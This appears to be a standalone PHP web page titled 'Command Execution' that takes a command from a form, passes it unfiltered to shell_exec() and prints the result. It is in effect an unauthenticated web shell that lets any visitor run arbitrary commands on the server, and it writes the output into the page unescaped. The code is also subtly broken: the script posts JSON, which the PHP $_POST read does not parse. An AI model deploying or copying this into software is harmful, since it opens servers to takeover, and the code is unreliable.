<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Execution</title>
</head>
<body>
    <h1>Command Execution</h1>
    <form id="commandForm" method="post">
        <input type="text" id="commandInput" name="command" placeholder="Enter command">
        <button type="submit">Execute</button>
    </form>
    <div id="output">
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            // Get command from POST request
            $command = $_POST['command'];

            // Execute command and capture output
            $output = shell_exec($command);

            // Output command output
            echo "<pre>$output</pre>";
        }
        ?>
    </div>

    <script>
        document.getElementById('commandForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const command = document.getElementById('commandInput').value;

            fetch(window.location.href, {
                method: 'POST',
                body: JSON.stringify({ command: command }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('output').innerHTML = '<pre>' + data + '</pre>';
            })
            .catch(error => {
                console.error('Error executing command:', error);
            });
        });
    </script>
</body>
</html>
